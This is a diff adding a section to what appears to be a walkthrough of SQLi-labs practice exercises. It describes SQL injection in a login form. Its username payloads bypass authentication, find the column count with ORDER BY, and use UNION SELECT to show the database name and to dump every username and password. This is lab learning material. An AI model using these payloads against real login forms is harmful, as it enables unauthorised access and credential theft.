@@ -111,6 +111,33 @@ contents of database
 * tables=emails
 * columns=id
 
+less-11
+=======
+In the sql-injection is in the loging form the form the user inputs are not validated so we can inject sql query in the username and password feilds
+
+payload :
+note we can see that ``'`` is used in the query
+* username = ``' or 1=1#`` gives the output :
+
+![image](https://user-images.githubusercontent.com/61080375/114434498-b49b7a80-9be0-11eb-90d8-a5fcc6d72aa2.png)
+
+
+we logged in as the first user in the database
+
+* using order by we can find that here 2 columns are used
+* username = ``' order by 1,2#`` => gives no error
+* username = ``' order by 1,2,3#`` =>  gives error
+* so two columns are used ,therefore  we can use two columns in union select
+* username =``' union select 1,database()#``
+
+![image](https://user-images.githubusercontent.com/61080375/114434423-9f265080-9be0-11eb-8cec-567aef71e696.png)
+
+* username = ``' union select group_concat(username),group_concat(password) from users#``
+
+![image](https://user-images.githubusercontent.com/61080375/114437862-b5cea680-9be4-11eb-8771-72fd9d52e082.png)
+
+
+
 less-18
 ========
 
